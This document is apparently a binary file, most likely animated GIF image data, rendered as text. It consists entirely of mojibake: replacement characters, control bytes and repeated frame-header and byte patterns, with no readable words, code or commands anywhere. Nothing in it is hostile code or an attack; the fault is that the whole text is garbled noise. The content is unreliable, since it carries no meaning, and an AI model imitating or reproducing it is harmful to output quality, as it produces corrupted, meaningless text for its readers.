a8�.v��6� t��y6I��g�wґ{�aKk3]CQJ:�%BU~�*��a+c��zV�9��D�9T5{�g��_N��ZW3bB\8���pr�40�U� ��>7����w�K2}���4d��aS�P�W���M�1'�-AB���G�g��wW��YƒtL&�.1�Vh,�фJ�(th����x)�S$c�.�HU�41$Sv7�-�w���T#��G���'E	�P1�bs���e��D�X3>4��h�h+�$K�������X.�ю�3�d{��D��H!��lT��$������y�@[�I�L�PҐ�XY_�s!q�x�籎��lK�� Qp9=RX�)YF*��o��0��2ْ4y�5��9��prD�t��7)��AvAX��@�+	��X!q�4�5�ӣnN�nI�T	�
�QO�&�D
U-��\A����GY\q�HIju)u��m��t)�l)<m9��@]aS1��3y�W�0��!W.�-���%��j��B*��Li�a�V����e-w6"��� d�U|�V�Ym�Y�eW�7T��P����<#Rc�v[iXF�X��nʹ��Q��iV\�n�dU�wa�`v�ѝa������@�wrXd��֩6�er55h���	Z	�DTw�'���9=���E�l�Ua��E�CQ�S!k�	/V5��_#�_��������y�����Ù��V׆S��3��,:9�&��[�a �E��R@Q1Š1�u(��W��UHZI�Qrn�tɞ�)��l���E��l�g�f�1X�(á��%�ؑb:=cz�\��BZ�
���A��az6m4�'�R�/*���R�vk�:�cP�mrzmZ��%_Y�١�)�6����2i�?Y�:&�}���S�X�za9U�zf��J��Z�������
�����jv�X����Z��Ɯ��EQXxY�։�l)�5m4��:�k�d:�A�!A@J��q��Y'�T����R8��Z��i��z�ꚮ캮�ڮ���VGt$��:����Zpꤍ
�o
�
��q�������R�}�4�[�+�z���۱�� �";�$[�&{�(��*��,۲.��0�2;�4[�6�{�8��:��<۳>��@�B;�D[�F{�H��J��L۴N��P�R;�T[�V{�X��Z��\۵^��`�b;�d[�f{�h��j��l۶n��p�r;�t[�v{�x��z��|۷~�����;��[��{��������۸����ᦐ뵒;����  !�  ,    ��  � H����*\Ȱ�Ç�[7.�ŋ3j��q�u�:�I��ɓ(9Ƌw.�˗0cʜI��͛����3���@�
�0ѣH�;G/�ӧP�J�j�;�X�j���'Ȯ`�Ҵ�N�Y� ĝ�w��ێW��� m:�s��E�r�_�u�����ܟ�7^�|�#K���.�{�3;�����u���Lz(��{�~l��uO ���UK�u��/��Ý7�;��K6�y�˟}�����m��5��9��\oTg3����u���\�V��� ����>��0��gn��̿bn�� �xW���K���9��7�v���@���9F�wg��z�=� w���c��C�[�a�ZY>X<�X��7漃�YV�`Z,�����N����Z�(��&U]_��H�(��|�x�;�X��Z�<'�r�;��D΅�(��(ژ�ų�霗8�q�gX���&T `Igp0Q9���a b��R:��$ K�[��#�qk�N�f�bV��)n𼳒�.=���e檸���U�4`xn%�N�Sш�m���i�&}DP:nub�Yqzlk���9���٨m��-�זkR��T�lIZ�)W<�}:�8��ۚ=0�[�U���Y�%�W��+����R��@ڣ[����+�m�3YUP�a�#�Z�W1e�RL�Z�A��8�.��:�<��h���Ggyc�NW+sd:٣�D^�a1�։?7
���js�s)ɱ�X+D��)!Y�X$
�p�d/db�3E��YވÎm&�����Dm H �[������r�5�0yS`Aӝ�6��j�u�b�SrMj
D5���Um��uO�����:��%�:�rel�n)Kt�3�
�;��u��Nb�2�o�[wL��k��`��[�j:�am�SK�A��Xj�M��̋EVѾ��ٓ}��$�s�����N\�pw��~>Q����h���;�.�m\ly�T��?��ly8��t�e�
�����eeN��
�~�>e<��\Pz0*�*�9XB% i�	��r�P ���U8��, ��I8�T6���eg]9]{H�w�#���R&&F�).J�ڢ�)$F�"R�BA_�
L<�i���q�Ch�:��}w�H�7���&~�	3w�=B�HԲ��蓥 (�1?1�g��?ń8YG��T ���HKZ�fU�egJe�V��̽��9�fȆX�(s�$��G�r)"�c2z(IY�r��V�3��aV
�'� ���BG9�H]�d�/��݆	)w���O*]΂t���$�;`��Y�㓆�>�h�τԒ&�I�7#��^�C��
��B�*
��!�L77���H(a���@B�f*j=n�I�&:З�S$EG83KՓ��;�@����%�+�P,�)�dD��?����m:�R�X�
)2S��BQ���a6][64T�|��F�I"��
�%�=S�����D��l=<�Iyr�pa͊7�ѭ�*R �	i ��֍bO��^�c�r�/]���c�3��dJ]`�2�"��-Im:V����%���tVX��� 672P�^�JĽ����sϮv�)�-~TC8�ϼht�+ݳ*u�J�N�<�"�El d���g�	�����|�%�d�J���e*s A�>#ߜ6�1������R�nA����ʑ݃:ґ���,�x�������6�&c
T��-�d����$[:IcL>�-��� ͤ�:��S.�����,oB���'Y�b�Ƀ��!~+IQ��}���g����y��=��	c|
dܞ�ٮJB�l�7�ؒ�ش���	�Q��N��Y {����q�����S�B�cR��	9
i�p4�π&	^�ܐ"{k�W,I
mҷ)G�$�rDΗ��ܖSnZ3NT]f�ՄFei
�?�0��%	#gN����ġen��(�NC����H`#腀X#��B�Li��z& ��-ɭ�����,S��HiD6m�����Z�";�MU!��3T�������P��-�y3$=o�w�#V~E�K���ܡ�|#��Hh�yi�49' �I�I}�M$��q���"�Sz%�=Цq�t|/�H���'r���!9�?ۨ����@ʊ�����
�G�����F�v'[�}��ꐂ��7��U5(B	��~QG6�FIU��\�H\]6!:ہB-L�	t{�Yܓ�p�e�ǁ�L�!����7�q�����ףG1\�yr��`��aA��B���~/�E87L��s�leM�fC^k�}k�œ"
��ˡ��ENjr���;�5�|�)�ļ�@X����#.�KR�El7�����B]?��N�L5�	 �~�p� �/���kS��Y���r�9�w�	d�W��Q��qot{�q9��eA~��+�Wi��d��T#ub�s��r&�1tR0��3�3�n%Q(�v(,�M��{�Gng�aH'Öw�‟V�a(��0,�ۤ���)#��q*8�)x,Qz�}�2,b5��7q(ah��P�u�O�F�SA�'}r�x�]�!�sL8��V��6
���uVxu�f|�u3at��}XN�a�(��swI���p:�udF����ho��o��}�~�>��&ȉ!6��x�����'F|���/���7���nq�Q7U��Q��(����x?�DMuc�Lp^*�}:!&����t{x�Z8��e�T���臵�O �?��Q'&�C�g +��*�H�S�O�H��Hn�ĎA�5{�*%}e�
E[�U&��ie��Z��1��S����TI��)}4���f
��$ّ%9{��R�(L�Wf�G�s��5E�&�>�ɑ��O.c13�?��ԍ��k��S�X�`6eb�dh��5	O�U_I�LX�,Ɣ$�.-&h�3�Sekf9�e��d9���L��Qoٖq	Qt9�s��xi&R�qP^I�tP9G7fwG9�q�ވ��YݨEy_ROMI��i�����I���^�x��Xubڒ�YYN��u ������q��x�������量}��So�N�\Q���Z���Jgr�H&�(�ܑb�2b�y��Y5���1k����Yg�	�܉_`���H����ZIe�X0M�YT�Y�aAwLP�9�ig�qL����Y��,�a���Z�v&��y�!�qfd�Ț���eS�e�ٛ�G5b8�Y�!�e�G<���j��'����)s���-��
ڡ6��H�u�g'ᢵBJ�FzB��湤&*�ca�JڤQ�GZ�Vz�X��Z��\ڥ^��`�b:�dZ�fz�h��j��lڦn��p�r:�tZ�vz�x��z��|ڧ~�����:��Z��z��������pڨ������:��Z��z��������ک������:��Z��z��������ڪ������:��Z��z��������ګ������:�2A��z�Ț�ʺ��ڬΚ����Ҫ�A�4 !�  ,    ��  � H����*\Ȱ�Ç�o�9q  D�ȱ�Ǐ Czw^ȓ(S�\ɲe�x�.ftI��M�$�Żɳ�ϟ@7�dgΛƠH��7nݻ�J�J�Jua�x�.b�ʵ�C���M�J��ٔX׍�z�-�s�º�K�����,b<j��O�����K���x�.5̸&�x�K�|22ExgR�|��:��C�n8��8ͣS;l�s��ע��S��m����s}�7az�e�.Л��by_~v�9s���.�U�؛���7�j��`*��N>i�qທ�������ߌY[���@���2��u��c�F�`6��~��Qѹ�d�u\X����� ���z-��Nh���`Pq��F�q"K ��g��E�:����<� ��S&��9��9���
�c��70΅��s]����`��ZT֔X��8&�$V�p�"wUZ9"<lnfQ�sy<;ƹ�e*����E;�pf��M�(h��h(J��dg�-6����\9^�) ��4#g�U���������jjHg")P���Î;�qY�_�ڠ> X*O��C숬u+U���Lt�)�@�J�ήv��<�Z�]��.5�;��9|~i��J7Q��h���N&��n�T��gO>r�9-H遥#������Q�Hp���cO����)��؁�e׍)b\���BH�G1�*ě��0��ʳ�铝!S6Ҍ���<�G�W�:;��}�|���#s�+O<-8�z�h��m��A��h�a��0�=�~'�)��S�˸F*Z���X��tggs���QF�c�\"V�S�,Т��<���c��%E�\El��q�, ]\��bP┳)=#�M�%m���Ik�F|%�f� 36�`�5J�U���`��e�x���t��|j�N8 ����F�3v���I��M$	4�Ȇ��9a��٘���E�m�kc���h ��]&0��dP%��&q`����UPK�S� `/{��`׹�h��X7����X�:R�b����]+l�����p2���s�C�!���[c�ŮU�X�"��!�aIG�Ӕ�lp.M������=Ib�T�ȓ��Z����/6zD��Q���5
��.�R�7Ƙ��}�Iz�"�ި�. ��y�&��Y�d� z��.1�$%�R�r���;�#3����~��Ǯ6ʹh�<!���hN��g	�(kY�*��kz+H	�NFx�l�U�4g�Q�!���M�x��)��2��q@&��,Q������ !�Y�3�%C<������,!��I�2V��9�9��P-���r�h�$�Xԡ
]�0��{rs�A��HP��_T�S�
��t�q��L�5PN��Lg��t8t�e�P5�����9�E�jT��%��>�O�-�(l�
Tt"��竻�gA����c'h�
V0��X���º~�%-Z
��j�H�5�Ty]��*�I-,)�З:А�ƕ��i~f3����F�{�{v3����G�T��!��NG�B^��hE�_�z��B�9l�QB
�i��@"��nIK��U� CemE��*�XU�#c����E9�]*Q���7*�0�G\�Aq�C\^��@*z�� ������r����)��\a��q4*��W���H��"An��S�j2��s�%S�F�5����S�zx���Q�wD,)��C�;���lj�8��P�4�@CdS9�d�a�*Jȷ��R��6 1F�C����Y��$��]��W�q$5�z��帶��y�ַ�z ��q�%���S���O^pw�fK����Mw������I��A��n��[#�����"�mm^w�#9���k�4Ҭ�x�I�������#�(�qJ�\�.���<Кax�g(J�կ���ç8v(]��梙)�M�F9�lP;$f�#��	�g<d��6o
��\�Ȋ�L��JYD_TK5M�c#�������`A�/z
f�ŴnNwB�G����;�R8륪CB��㍒���!�+�2��/���@�*&��8���v��h��ď��z8D��<��$���%�ûe$�Z��AR�>G�'fu��B�#�k�?^��NR6Ҍ!y��A��9�D}�f ���#����x	�.��AL�չ2IW^aEϦO�6#��!�Тk4��ĝV��d*�<(�W-���~�� �!Yu���ΐ��
��Ys>Ƨ�w*Q\C3�$"����wm����
�ǘ��02�e���n�"�:����Cg�2���)3������q�W��%3�J�j���N�}]|��9B�c_�<y�W���M
��/��#bɎ��:�@}|?�X�D�w_3�G��i�tm�V�;��	�]�Cv�*ڷ�H47�B�4�Q)+�r,�3�w����'��a~*��=bu�!|�"�B1%-1D����Gm.e<؃*�4�"~��qm�0HqHjeޕ�� -�i1h��|
�,Qe�1��#��1&����'&�s63!5�q~q1be��-4d�uҒ#�TV��u��)}a���ݖ��Ub�q�)1�O|:����L�ca���d�_q��/R��i�j�xy�FqrVZ�C%��QBA�4���\�h`�'+�v��U��Չ��R2$5�^��[�T�	�C͈�gU��P2��ֈٸ�V���I���4��@)h��`4��S���uJ�K�P��|�L�� ��x��֏wAM%}��/����J��a�t�����7r��#~�l�R�.�U� ,��؏c�|3�)��c3�$	�� ���B���LɃ�d$U0�`F?a��8o,�/_';tEHr�2H�-� ݣ/H�
$�4�^N'yw�A�p�XUh�q�v�Yl	�O�)�o�G���Mx�y��oy��qᗄ	�P��!�Y ��c�9P�������k���q�Ō_Չ�ԙn��@ '_ϥYO�o��R�%_&���L�q&.�"��O�R,�����u�)>�9ř_��oa�����e���I�)��w{�SE!h$>b��Is����D���Z�L&1�akǚ����fy�fWo�q]�z�ٚS��3��e��y+ek�uR�6#
��!��:#D�P�&T36�Z���Cֱ<���i��1��6�jŜ�� [�E�p0� ��4�~�V3N�A{��:����>c�:�3�ٖH:�>�M�P5��9�@�x��ySZ�wDwW�a�V]b:��� jk��k�R��.妿�H1�!'დQ�-�����kk�[��5s���O��1ްH5�Ҩ񴊐j���Y|*u�j�Y�a����zS$��
��(�����ɢ�_�U���e��������:�S*x�W�i�%
p�]E���nY�㉤ƚ�fy�̊�Ϊ��y��VD�R��
��`�EW�n9�c��P��PZ2��Qxh��5���
����2��z�h�Tx��y��X�����r�:��J�[���z�����U�h(����Z�ܙ��X_����Q2��u�mJd�kjZa`ڲ�9�jU�2���V�rY8{���'w3g��%��U���Љ�dI[�iI�J+>O�����y����X˙k��P���굣i�#��iU�֥:�ʮn��4���:�L��Y�Zy��2���w��  !�  ,    ��  � H����*\Ȱ�Ç�`��=x��E�ȱ�Ǐ Ci�]ȓ(S�\ɲ%ˊ���貦͛-���ϟ@�
�X�=v�*]�s$�s�J�J�*Ê�g��ׇ#ϙ�J��Y��i�z�-Y <�ʝKw�=�1Ҭ�7�Hq����K�0S����5�8����K�22V��(kF�S`�͠C74��[Ѩ�@ob�ע/k��m�#{R�ͻ�e����[�q���	>G�8��*:�~�(Ro�mÍ9���Y�����0=���ӛ5 Ȯ��w98�� �6�os����Rx��֒7J6]�'���OF>�� c��7t�A�!Gj���9��NR��㍆n����CO<�Sf\H�8��`Q�(�B��C�b@��h���W:�)�A1�;8�$V�:��\:�3֔d���V?=�n��c��g�t�;Q�9�`ku��8Jj��a���:��9�=3�U"N�s�:ဖ�q��fu�6�$=�J�N]:�$�޵;h�di�P�jXOl�&�~"�?�U���Y�x �S+����~?�Tg:�J֓;|�i$�Zɪ�@�tׄ�!%kY�a����	˙���3na�v���޷��_`�[[��ꩽ��VP�������$�c��]��$���&�9����Ut���$Ф������rv�m�n�!9���m��U,fx���]0C�ħEE�<X��UX� �qwa��
9;P�}yC-<�`�UX+O-���h��F�dQ�K* s���y1
ݐ���D�g�������ݽ�u��?y�hQ��b\�;W��)�
kن���\�p]�hq���
�vc�������B���@Hm�Y�u�$u�U��[c'��Gt��.i�j���a򩉧TI���tQ^���ό_�������0c,�æ�n��{��%�O%���=��`�
��S��cL��@��.��9�T�e��Q&.$�������͊��Xf�.���:A�	�xy c�� �P.�ca_Ԃ��p &����ėp(	p:dL
_���j25�G�&�/2�J\��QQf�9⋱ޑ��]�,�i`P�c��0 S���b�3�EqZ�j*¤��u�#Y�b���d�y���2GA�2�	q��z�.G�d"����%���Ȍǒ��Y34G�d�F� &:��˒H��7��A���\7�X��H�t�8�����e�	2}y{��*b9H�2��Xs �����i��}Xa�Y�̚,1�8��X���h(�@P�±��%4�R|^G���󗘱Jq�[�.J�rdl���&�8ӄA9¨F��́�M����U��D�h� jI��Α/NLbrG٢�J�ȈF8eL)z���4t-Frҁ��4-ZY�aK��Q�[��h��DID���]���qq0��#k����IB-�hOD���!y�;�2L9�+�k�OFR4Uq)�/C֜jE����8��:��4#��Wsׯ��@R��j�T'��%{J��AT�֞�*�q��jP�d�WXbe�rZ�n ء�QO̮#b�۝6
��l�t8�.N#��II
5[���a�AtBϭGIًOY:jŰ8b�
���7� ����NVٱ���R(��.J���d JHRz8��D���]H�r���iTNe$#Y��Y�mP�s1�Җ�'aQ�2�%�6ɡ�Sh �^��8G.>Yl�L�P�=U�؂��J7�Jk:�;�yX(t�Q�&������V:�'�D.��4�o!7�.P��� � �k����##9�VSI	с�1��҅�|U53m���n�U�h�V��*Fq�ym����������A�HI=� =��
'i�B�*
F�3�J�W�-��9���(�fM+�"��Mz�w'Zȩ��8�sP�O�m�3��@N�l�h�f5�
m>ӈU4E�lؐT�`ɯG~=�����Nw��]�k��ۉ�$tO�?�ܰܞ���l�~�S��T�
���(�U�bF����f�Q��xp�#|��J4�ۤ�Pˌ&^�{\I��AyA�0�x�#�0�M�M� f�W+H�9Me��.'�k"��07��W�s��$:W%�K�.�j襄����{ P�n�ǿ�Ė,�y�I:�AT���$�E	�
cu��[_;C�T�Ȍve:�[����%����l�z{�L)w�x����ʻ
c�eR�$�*D|�d�==�O	�5�y�,�%_I���;���Ps��q��hy�A��q�����;_�����L
g�yB!?��ޓ@.�)Br)�JN��.z��ʸ!�}[�/����_��3N��D�#�v���I�����r5RJ*�L�[�~��������E4�d	fuT�u��i���l��]��Q1
a6�H2WL@!���1}�v'�W7I�U|M5��n	������2T|n�H�
Q$�,�iV��W��c�q�~� ##D��A*����qQ2��.���38K)q��V{�g'�dt?�Zh����j�+x���tp�hT�Z��\ň��Q��Xr"5J� �a�C�(HӉрa��b��+���f+�H#2�?m#��S��Q8=�y��G��'E��P���an�ċ�� AA�J�E%�8���hH���^���1��2��6Í=A��O�x/���Fܨ%A2��ш>䍑���8�ANS%��Ր����y^��^+���E\��U=1��^8�(�$���9�)Y�(ْ*��:T�:_ul��,��7�Aw!X[���*�`-8|�CQ�(����<�f��E+��3��{��Y�h8Bc�!�a��b��dy�� @)j�5����n�f��b���8��@]QS��`/ɓ��
v�-X~��^v���6�rAB#J�,)ZQm~允�}!"/%d�UzfC�yVge��Zs�"ACUQ�iQ�(P/�%�TIV�����1��ƛ�6��I��y�i��m�`�p_s�[�h���)O�cW#��A]b��ٝ6՘��)�+HSV�K����~��U�����k�lHa�E��SQV�&"��n&�ޅ;M	y�^�֔�՞+��)��9�ڛX��%mx2#�� e�X��bve
�R�Q�S-S�1r뙙��	�e�uҐ9��+(�()Z>�܉��#C,�i�g~V�IV���ݴ�8�<S:�3�=��U��
�7
�g�'V2#V*�@q(vZ��R�&h�5i8�cLcm*��Y�	�J�s��9��i��7Zw�D�����%az�n�jXgzS�S�Z�����ũ�ک�����j�Y��J���S�ҧ�1�iQX������5=�9�v��j�pҫ4��㹥/��ۉ��
�	Zc���1y�5��:��Z��z�֚�غ��Z�>�R*�"y�P����X~��������:nƚ������w��J�z���
"����:�[�{���
��۰���;�[�{�����۱�� �";�$[�&{�(��*��,۲.��0�2;�4[�6g{�8��:��<۳>��@�B;�D[�F{�H��J��L۴N��P�R;�T[�V{�X��Z��\۵^��`�b;�d[�f{�h��j��l۶n��p�r;�t[��v� !�  ,    ��  � H����*\Ȱ�Ç�[7.�ŋ3j��q�u�:�I��ɓ(9Ƌw.�˗0cʜI��͛����3���@�
J��Q��΅<ʴ�Ӎ�J5j��ԫX�j�zSH�`�޴�N�Y� ĝ�w��[�V��� m:�s��]�r�߆ �)�K���
�/^�Đ#K6k޽ɘ��h.3���z]t)�i?n>�:(��z�
�����ގ
�ܻ��On�y��˟}�����qm��9��9�\^oWe+��{�u���\�V��� �z_�q]q��ߎ37��S�_/�ߏ�^<��$�R:+�uN:�M��i�5�; �L�Ý[��z�9�!^l��K��cYr��Uj�y�aY𰳡K��s�[V�`Z������΄�s�kj�s�\1
��T ��
�O�/�'��m���P����";��D���x�3B�[�dB�e ��s^J�0�ݞb)%b�N�e�v�5Q9���a^+��hQO@���7��#�^�yVK"fe(����;+��R�Ϲ�5�S��*p��ߕ3	�[6ʘU8q���j'��i�e
��[��hdVc�R��c�/qj[ᴔ��֖{����%A���߲RMk.l���Τ'Ue�~��5��,q��h;�=���,�FAL�d�RD�z�*�9 ���~g֪�%�U۳n����J��o!gv";�p�ң[��u��c�V�Ɯ�N��3+�#�ec^�����P[�=�քs^Kj��͜0JJlV�!���
��3MS
�OySamp�
��-�$��<�&�bm�%��m�k3�4][�ɨV_nV>#�4�@��S�[�,y^�\�Ml������˕7�n���:9����ηa����X1��\��M�v�gKg��5�V����8���cͶ�����S��HWhY��G�����K�.�:q�(o��>���~���\o�7�[B#��MEk���̚g�
:��V�A�^�h<�U�B� �e~R�I-����o$�{K�B:e\�:��p��a.��ڬ�B��o*Vq`��� ��&�@�_�t��p�FyǶ�%b�LP��fh^�E'V��7���ޫ)$���XF�,(�;ǌ@���1 ?1�	r�����m�	 qR=��(}E��b<�����?1�h�D�@��6)�@�T#���HKZ�f��e1J��V�Sf�=�9�8di�>6�tdJ-ɟ-旐|dRT
GID3ؒ���\�
Bʘq>����pBG9 �K7�w�i�@���s�Ҝ�Y�;�Ī'd�!Z>*Y{Ų>��cH�9���� ��Ih��Ɉ#�\9I*d��j�8�Y!���\51��f*f�	�(ZP���$zD�,gi� �G ���f�IN��
s�q�K�aK~DH|4bPȑ:���<��R� ��:���
�Љ
�����Bز����#K:jO�x�\
� -ј8x��$'��4��fJ�[���r��(skV����>� !�S[��\E'���
�&�:3!���Fm2�N��e$З����%i�)���	�K𒭐�����4H9X{JC�v���I�d���&)3z%4����:�zKM�R�����R!�|*g���҇��N튻ٔCE1]I��[ zV����
W��.��69�ceIK��K
�n�Z�	�Ǒn��q:zS��P/�hϔ)�y�� ��o�&l�y`�7)�R�y�v4��X�:O�θ��
N	�,�F�d!}H'�Wׇ�3��N|Z�e��VR�V�&�=���"Oj�"�{�C7B��� ɒ��n��+Wy(��r�3"Y�����@�Fdm�iLIH�|栤�!Q�d���xV�& ǥ��g��%�	.n.�"Z�#n�I��㈜���	옘�g��:m��	�ʲBk:#��P�`�t�(�5B����p�}��1�׈k�%T� ]�T�$0�
��GB�3�DJ�>�Dnm��8���ɧ�=m�P���]^����Z*�~�sLh����#	�H�͐��V'�r�kwf��R`��zw4܄��8�8;&��2�1b�}�f3�V�q�Io���Y��Md/����gLj�r�L�$��Ej�s��$V�������?$���E >q�m$��I�{nt��#����t0t���U�H������(�]���ދ�;�A���$:�CM�L� ���(��I{ONm�
����B�>��n%}ǉ7�z��"7*�Y�Md����B�a�
���X�-�v��)z���Z'���.�)�O�k�i�!�?\�2����d�7���ήY�o�A�9A@~ʱDE�6c����{��	��D��zW��	i{-IK�������	��_dݳ����J�����)��e~��w��S���¥q�Wr&�11�M	�r��"&aܧ,a|`�r�G�Gv^1/�Vo�Ҁ��I%q(Ƃ0"��䂚f��f.W�MH,�y�}�",8�4��d;��v+:A�G2P%8��:eQ���'%�v.!��CR��tZhrC��3���=��[5�~s�Qx���Q|�ᅊqy�U7F)�d��%��8�5r��a��t�����3'�}(s�~��|�|����2�uYw�c��QA!�+��'��'�h���Q�Q�`KՋ��Tui�)�t��e2Aj���j��7��P�����Q���ax�ݘ�+�Fi�8��8SLy��A��n4���v��^؊����*T�O��|x�d�?(�L�d�dM��*� ��n���8�t8��W�i��O�1��؆����x�$-qo��Y�.	��8k�x�W@ �w�Ad�hk��=��f�LJ�d'}U�KF� �LP�LJr_�T�%VUX"Wi��^��!�L��L�1��Qd��g��j��_	 Er�]`I���\���~�����@釁ՓHVIDs�lȔ�y������cو��،K�Q	�jؘ���� 0p��U50'��tؒ������9�~	���Jp�N�[0���R���J1�����(�֜��=65!�A�l����xӹ�ՙ@&��،���a��a�r FP�ٙ�d���&u��9�Ҟ����I�O��L�+{X��j`��	�y�	g�x�����9[	���Y�28���8����&�ڡ�ɠ�i��h����٢$��)��/�������U�y�/�x<��@Z\�gDJ�F���$�Jn+�N��P�R:�TZ�Vz�X��Z��\ڥ^��`�b:�dZ�fz�h��j��lڦn��p�r:�tZ�vz�x��z��|ڧ~�����:��Z��z��������Wڨ������:��Z��z��������ک������:��Z��z��������ڪ������:��Z��z��������ګ�����;'�F  !�  ,    ��  � H� A{
T�!Ã&�H��D�-:���ą�+'  �(SzK��ʖ-_IP�Kq��eL���Ξ>Y
J��ѣHaƃw��ɤP�J���xT�j�z�eש]��S,A�[��3���ַp�7�jE�^�՛/Ž�k���È[Ƌ��ܸ��#K��^<Ó3��Lq���[r�8�`�O+��n�c�����L�9v�y~ƨz��пA
�M<1��MM��W��O����sN�/_�d�
@8�����v�7(8���m��_o�r������n4<U�T᳟��s�&NE���߁ݖ�~R�ipa��h���Z�h�M�S�?�� L�U;�U!i�Y��¹#J��h�A���S��sc���Cϊ?�F�E��]|�ͤ�yF=�%眇8�0�XP�Eb$�9�]vZ�(=I_�g-���R�)�@��C��6�ǜEO�c�#B�"Vs�%�O��\j.
(A� �gm �Xhb���ѡ�҈�Q�^��H�L�\s{z�UX=**xn:�yX�obw�EL�x)l(i�R��ֵV�=�䁵��^>��#8o�4���X4�A�J(Q�T��U��=��[T���8�iPՈ����X[��&E��t��Փ�>�OEF��T䍂�%���ƫn���hnu�~c�Y�kJײ�-M�}+P����0x�[�:ܗ||���v�%���O�8!��O�50K�96Zef�Q��f�4���6�L�:�  N�Rѥ��Yt E���`I�N�ԉ�N:���5h4q�(���m�}��9N�
 ���@�ŏm=N�9Mє0UN�Ӥ�f��ĉ$N�p 995�TGG�rDi#$�`�����j�����1\&�U�л��U�Y�`8��Hu�He-�����O�^�&�F;LG��L�k���W�[�TG�nA��ȷ�;���[�ԽN��|�D�>r4���p��[�Q�!ͯb�_�"�	~n}I��k~<�a�l(��&���Y����0((�j���'��
/da�ʇ��d ��?�NV� �d����	�D�~@*G� u$YA����!߲p|��o����s(p&X*�xHx萍�A]n��Y�-L
�G:���K��YȌh9���`eC�����q�fћ�ֳG:f�`���2>�t�"��N��1Z�p�ZԊצ�P�vqV&� o�	��!Jt�\���9��_i�U�����p�\:���NtA�MR~�	\��'�tu�~ީ�h/����"df��@�ԃk59�õ���ћۜ�����(d�E!���\~�Ά4�9E��R�Q��cat�&�r&%��.8sa�4������¥�V2���H���]��b��Tџq�9�u���#����B�-������O(��q���_�^�P��Ħ
M�<1"U� M -g!-��ı�3���D�	N�ƣ-�iQl�%s�c���KH�ʶ��r>7ӝ^_h5v�Č3=��^V0����P,�XV�mt��RJ� �5(&1�M/���G�H��>����6��O�1d��A���ֲ�s�a%�nY��F*��b22����
��n�ە���1���n�\�X�.b6}�='	�@�{#��į�.F\����e��Zҽ ��R�W�{��=�*�-7WD*��'���;��U	��6�jo�T|�����:\ ��e-Rx
d\��U�ţZF��Qg1 d�Q�3L�m�9V��j�ҽ�QRi�0�CQwI�*YN�<��+LAޚV��L��05�x�KS���EI< �zy�&j��)?��B�x�d<L(� �R*�:K�>6M�l]S�ޫ��w3��BNxgQaW��]��]h��"�}�~�G�����+4���N�9:o����Yԣ��6�KB(ޢ�Y%>�I��Rխ

�E}5�[��T�$�>�N<'g]A�������*�tD�aSF�1���F#�T��-C��D�n��j�zη@>2M��I���Ŧo�m�-�:*��OS�rk�Ԙ���YH��f�V\�!66MD�3� ��۵z�cs����u,����U�6]n�˺v# ��.�z��{Q��Ӗ�s�l�98$7�P�T_|*��fԷ=�I���T�mD��k�"l RD���[c���]����4�W�>G�9�1��R
�U�lD�9��V?�+
E��(��dgxoM�"��ڏI����~C∣���3K�J� ����O=��m�:Q�1o:�4.+S8��}>Okq����R9�A�8�v2�&�|(�����oi�9{��A�Vg�z�~܏���� ���cƟ8G��r��O��~�;�ۄ�KI����^�L����|l_�vxwey�m@�&�qd��0� �����^�& �e�#����A9�P�&��z�F: ��F�Q�ҧ��c(s8d �W�Gd��Ia�OQ4
y�Q7f"$䒄�d�'X��'tB�'��Q0��\K�:r>Rt���@{>�v��}b�"�s_3ṖHd�-:�w
��ڶ{�G��.h ^.�d 1I8$j���h׈��dz��f��Zl���Ee�7@GK��C�Gds��"JF|r��W@�!J(�S487W�cK�(Hv�%,MY�F�:U��$M�C&(W^���0j��'�W/5BP�����"�"^���!H��&����;�b��aD�H�&��H�8�#�~I'�t���G�e�A%����X� u�s3L���",�Pr��o�p�7p�w{�����0�D�'� !i
�%�x_:R&�8a�8,^f�.�� (�))"����vpRL��tmV��o�y�Ӣ��(d�7:��~�#R�kCS�7(���#Xu_O�Qc�6��kf���U�s9�^�1L�u,�@sG�@VI9��Ȍ$�~���x���m�(�GG]�G'.�B�	r[G�G���L�v�o�m�)d��[��z����h (�T�n���	��W���*�2�8�Xf��!Vy�tQ��9���Ŏ�I�}fVvpg�5���I�_E(u��� ���}ȁ(/�a_,)�����"�~�8��y����3���Zez����daĦ�W��!9	7ԋы��������F"�D�	�������I>EyJ�XQ�5�#����/��0.)a�"�n��s�6.Y�,h��Y�}�O����|E�t�o���v�	.@ǈ3�e��hMg7I�8JOh�T��.���>�/B9�����a�T�uewwڤ��.rz�?����8\�ǂj��Z�vaj���b#��e� �$��1Z>w���r/���$"!gIA&&#b��"�:ixE�1��a�]ӡ-q������Z�&j��������B�z�@Y�(�����L�J�@e���⩇�/t���u�t6~��8�[Be{�� !g�Z�2/��O�w��p�q�L�G1����#5t��w��eX鋏��:=��yJ��1�Q��8��;E�S�����A&��i����[�P`����k��L�-���W��ĺ��a����fJ���8���Z!;�{��ņ�A����Jk�l�7^d�@7k�U�Zʺ���I1:��^q���2/�d�������6�%�R�`%P4
�CJ3��2�*f��=I[�)�q��s�*+�#�Q���T�>�V�ps�(Q&�yAq��}��G��%�g*�>�e���;�2�@���:%�4���Zkל��zkNW嬵Ǭ�����
���'UZ$Zi!���W�����*� �Fa�kK��z� If[E��W��z'�Bҁy+�3�[�*��|�%`��W�O�����ɬ@)osuE14�;���f#.�.E;�$O�%�RW�,��Z�a\�Dv(���g��+#�1g��a
�����$nI�ҰJ�B�tږP�so2y�����F��y(�3J�B���K�t�P��31-���ZgE*�����>f8uA��lT�J�&�*���T;����qj���|�`����������c�v�.��/32�B�b���ƙ��X�g\�w6���ߪ�A$��Nu؀[�XAY�a���s:���k?;{Fc�#Qg�� �������Ş��Dv�e,��K���[,�+�pl���;�ƹ��T�(4�����~:uo���i��:  W��J.�(c3�w�3Xc�E�b�Lu�����;�s;ȅ�0L�1��%�+�@L���L�4�����21��l���o<�FE*P��?ٖf�k�X<�-BqL�@�����k��_�p!�&"r J�><�*'�)��+;�����:���IwlL���ҝ<��7Y��"�u�]�Mp�\p
��|��̿�;��T�L隟��U�l< w\��NV�K�)d�G�i
2�AM�,e�<
��:�>Ƽ���P�\�-���Q��Po�,��D��HJ����R(�7B�P��W,Qإ���k	d���>p\�R�Zjն�d�����EP7�%
e���aؐڔAґ�����8��=l�;�����Ǜ�/�,�ǒx7�~��3����-hk���m�ñ��̧�-�"�z���!�h�A�Zݿ
a�����ѫQ9D��vqؽ} ���A�8���>4�B� 1,]J'
